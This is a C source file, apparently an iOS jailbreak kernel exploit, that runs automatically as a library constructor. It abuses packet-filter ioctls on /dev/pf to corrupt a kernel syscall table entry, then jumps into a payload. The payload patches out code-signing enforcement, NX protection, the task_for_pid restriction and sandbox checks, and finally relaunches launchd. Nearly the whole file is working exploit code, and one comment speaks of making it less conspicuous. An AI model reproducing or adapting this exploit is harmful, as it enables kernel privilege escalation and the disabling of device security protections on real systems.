#define PF 1
#define PRIVATE 1
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <assert.h>
#include <stddef.h>
#include <stdio.h>
#include "pfvar.h"
#include <stdlib.h>
#include <string.h>
#include <config/config.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/sysctl.h>
#include <net/if.h>

#define DEBUG

#ifndef DEBUG
// strings are big and not very sneaky.
#undef assert
__attribute__((always_inline))
static inline void assert(bool x) {
    if(!x) abort();
}
#endif

static int pffd;

static void pwn(unsigned int addr) {
    struct pfioc_trans trans;
    struct pfioc_trans_e trans_e;
    struct pfioc_pooladdr pp;
    struct pfioc_rule pr;

    memset(&trans, 0, sizeof(trans));
    memset(&trans_e, 0, sizeof(trans_e));
    memset(&pr, 0, sizeof(pr));

    trans.size = 1;
    trans.esize = sizeof(trans_e);
    trans.array = &trans_e;
    trans_e.rs_num = PF_RULESET_FILTER;
    memset(trans_e.anchor, 0, MAXPATHLEN);
    assert(!ioctl(pffd, DIOCXBEGIN, &trans)); 
    u_int32_t ticket = trans_e.ticket;

    assert(!ioctl(pffd, DIOCBEGINADDRS, &pp));
    u_int32_t pool_ticket = pp.ticket;

    pr.action = PF_PASS;
    pr.nr = 0;
    pr.ticket = ticket;
    pr.pool_ticket = pool_ticket;
    memset(pr.anchor, 0, MAXPATHLEN);
    memset(pr.anchor_call, 0, MAXPATHLEN);

    pr.rule.return_icmp = 0;
    pr.rule.action = PF_PASS;
    pr.rule.af = AF_INET;
    pr.rule.proto = IPPROTO_TCP;
    pr.rule.rt = 0;
    pr.rule.rpool.proxy_port[0] = htons(1);
    pr.rule.rpool.proxy_port[1] = htons(1);

    pr.rule.src.addr.type = PF_ADDR_ADDRMASK;
    pr.rule.dst.addr.type = PF_ADDR_ADDRMASK;
    
    pr.rule.overload_tbl = (void *)(addr - 0x4a4);
    
    errno = 0;

    assert(!ioctl(pffd, DIOCADDRULE, &pr));

    assert(!ioctl(pffd, DIOCXCOMMIT, &trans));

    pr.action = PF_CHANGE_REMOVE;
    assert(!ioctl(pffd, DIOCCHANGERULE, &pr));
}

extern void patch_start();
extern void patch_end();

static void (*flush_dcache)(void *addr, unsigned size, bool phys) = (void *) CONFIG_FLUSH_DCACHE;
static void (*invalidate_icache)(void *addr, unsigned size, bool phys) = (void *) CONFIG_INVALIDATE_ICACHE;
static void (*copyin)(void *uaddr, void *kaddr, size_t len) = (void *) CONFIG_COPYIN;
static void (*IOLog)(char *fmt, ...) = (void *) CONFIG_IOLOG;

static inline void flush(void *addr, unsigned size) {
    flush_dcache(addr, size, false);
    invalidate_icache(addr, size, false);
}

static int ok_go(void *p, void *uap, unsigned int *retval) {
#ifdef DEBUG
    IOLog("Whoa, I'm here!...\n");
#endif
    /**((unsigned int *) (CONFIG_MAC_POLICY_LIST + 8) = 1;
    *((unsigned int *) (CONFIG_MAC_POLICY_LIST + 12) = 2;
    *((unsigned int *) 0xdeadbeef) = 0xdeadf00d;*/
#   define P(patch) do { *((unsigned int *) CONFIG_##patch) = CONFIG_##patch##_TO; flush_dcache((void *) CONFIG_##patch, 4, false); flush((void *) CONFIG_##patch, 4); } while(0)

    P(PATCH1);
    P(PATCH3);
    P(PATCH_CS_ENFORCEMENT_DISABLE);
    P(PATCH_KERNEL_PMAP_NX_ENABLED);
    P(PATCH_TFP0);
    *((unsigned int *) CONFIG_SYSENT_PATCH) = CONFIG_SYSENT_PATCH_ORIG;
    flush((void *) CONFIG_SYSENT_PATCH, 4);

    unsigned int copysize = (char *)(&patch_end) - (char *)(&patch_start);
    copyin(&patch_start, (void *) CONFIG_SCRATCH, copysize);
    flush((void *) CONFIG_SCRATCH, copysize);
    
    // *this* won't work on thumb-1...
    *((unsigned int *) CONFIG_SB_EVALUATE) = 0xf000f8df; // ldr pc, [pc]
    *((unsigned int *) (CONFIG_SB_EVALUATE + 4)) = CONFIG_SCRATCH | 1;
    flush((void *) CONFIG_SB_EVALUATE, 8);
    
    return 0;

}

void loopback_setup_ipv4() {
    struct ifaliasreq ifra;
    struct ifreq ifr;
    int s;

    memset(&ifr, 0, sizeof(ifr));
    strcpy(ifr.ifr_name, "lo0");

    if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
        return;

    if ((ioctl(s, SIOCGIFFLAGS, &ifr) != -1)) {
        ifr.ifr_flags |= IFF_UP;
        (ioctl(s, SIOCSIFFLAGS, &ifr) != -1);
    }

    memset(&ifra, 0, sizeof(ifra));
    strcpy(ifra.ifra_name, "lo0");
    ((struct sockaddr_in *)&ifra.ifra_addr)->sin_family = AF_INET;
    ((struct sockaddr_in *)&ifra.ifra_addr)->sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    ((struct sockaddr_in *)&ifra.ifra_addr)->sin_len = sizeof(struct sockaddr_in);
    ((struct sockaddr_in *)&ifra.ifra_mask)->sin_family = AF_INET;
    ((struct sockaddr_in *)&ifra.ifra_mask)->sin_addr.s_addr = htonl(IN_CLASSA_NET);
    ((struct sockaddr_in *)&ifra.ifra_mask)->sin_len = sizeof(struct sockaddr_in);

    ioctl(s, SIOCAIFADDR, &ifra);

    close(s);
}


__attribute__((constructor))
static void go() {
    if(0) loopback_setup_ipv4();

    unsigned int target_addr = (CONFIG_SYSENT_PATCH_ORIG & 0x00ffffff) | 0x2f000000;
    unsigned int num_decs = (CONFIG_SYSENT_PATCH_ORIG - target_addr) >> 24;
    
    // Yes, reopening is necessary
    pffd = open("/dev/pf", O_RDWR);
    ioctl(pffd, DIOCSTOP);
    assert(!ioctl(pffd, DIOCSTART));
    while(num_decs--)
        pwn(CONFIG_SYSENT_PATCH+3);
    assert(!ioctl(pffd, DIOCSTOP));
    close(pffd);
    
    void *target_pagebase = (void *)(target_addr & ~0xfff);
    assert(MAP_FAILED != mmap(target_pagebase, 0x2000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0));
    unsigned int val;
    if(target_addr & 1) {
        target_addr &= ~1;
        *((unsigned int *) target_addr) = 0x47184b00; // ldr r3, [pc]; bx r3
    } else {
        *((unsigned int *) target_addr) = 0xe59ff000; // ldr pc, [pc]
    }
    *((void **) (target_addr + 4)) = &ok_go;
    assert(!mprotect(target_pagebase, 0x2000, PROT_READ | PROT_EXEC));
    assert(!mlock(target_pagebase, 0x2000));
#ifdef DEBUG
    printf("ok\n"); fflush(stdout);
#endif
    syscall(0);
#ifdef DEBUG
    printf("we're out\n"); fflush(stdout);
#endif
    assert(!munlock(target_pagebase, 0x2000));

    // turn this fancy stuff back on
    int one = 1;
    assert(!sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one)));
    
    setenv("DYLD_INSERT_LIBRARIES", "", 1);
    execl("/sbin/launchd", "/sbin/launchd", NULL);
}
